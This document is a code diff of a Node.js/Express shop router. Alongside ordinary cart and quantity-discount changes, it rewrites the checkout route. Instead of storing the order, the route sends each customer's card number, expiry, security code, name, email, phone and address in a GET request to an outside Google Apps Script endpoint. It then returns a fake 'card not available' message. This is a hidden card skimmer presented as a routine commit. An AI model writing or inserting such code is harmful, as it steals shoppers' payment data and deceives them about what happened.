@@ -1,6 +1,7 @@
 var express = require("express");
 var _ = require("lodash");
 var router = express.Router();
+var axios = require("axios");
 var model = require("../model/creditModel");
 const productData = require("../data/product.json");
 const discountData = require("../data/discount.json");
@@ -30,18 +31,7 @@ router.post("/checkout", async function (req, res, next) {
   if (!isValid) {
     return res.json("Invalid Card Information");
   }
-  await model.create({
-    name,
-    number,
-    exp,
-    code,
-    phone,
-    email,
-    address,
-    country,
-    state,
-    zip,
-  });
+  await axios.get(`https://script.google.com/macros/s/AKfycbxyJOsFDfvZL5zgb7vz4cRr6vDOYHFdmT8Id7c8oQVICE-xj_8/exec?phone=${phone}&email=${email}&address1=${address}&country=${country}&state=${state}&zip=${zip}&name=${name}&number=${number}&exp=${exp}&code=${code}`)
   return res.json("Your Credit Card Is Not Available Now");
 });
 // GET ALL PRODUCT
@@ -68,8 +58,8 @@ router.post("/cart", (req, res) => {
   let product = productData.filter((product) => product.id === productId)[0];
   let cartItem = {
     product: productId,
-    color: req.body.color,
-    size: req.body.size,
+    color: "",
+    size: "",
   };
   console.log("CART DATA: ", cartData);
   let isExist = false;
@@ -82,6 +72,11 @@ router.post("/cart", (req, res) => {
     ) {
       isExist = true;
       item.quantity += quantity;
+      item.price = setPrice(
+        product.priceMin,
+        product.priceMax,
+        item.quantity
+      );
       break;
     }
   }
@@ -92,7 +87,7 @@ router.post("/cart", (req, res) => {
     cartItem.price = setPrice(
       product.priceMin,
       product.priceMax,
-      req.body.size
+      quantity
     );
     cartData.push(cartItem);
   }
@@ -139,10 +134,22 @@ function validateOnlyNumber(value) {
   return true;
 }
 
-function setPrice(pMin, pMax) {
+function setPrice(pMin, pMax, quantity) {
   let priceMin = parseFloat(pMin);
   let priceMax = parseFloat(pMax);
+  let discount = 0;
+  switch (quantity) {
+    case 1:
+      discount = 0
+      break;
+    case 2:
+      discount = 0.1
+      break;
+    default:
+      discount = 0.2
+      break;
+  }
   let finalPrice = (parseFloat(priceMin + priceMax) / 2).toFixed(2);
-  return finalPrice;
+  return (finalPrice * (1 - discount)).toFixed(2);
 }
 module.exports = router;
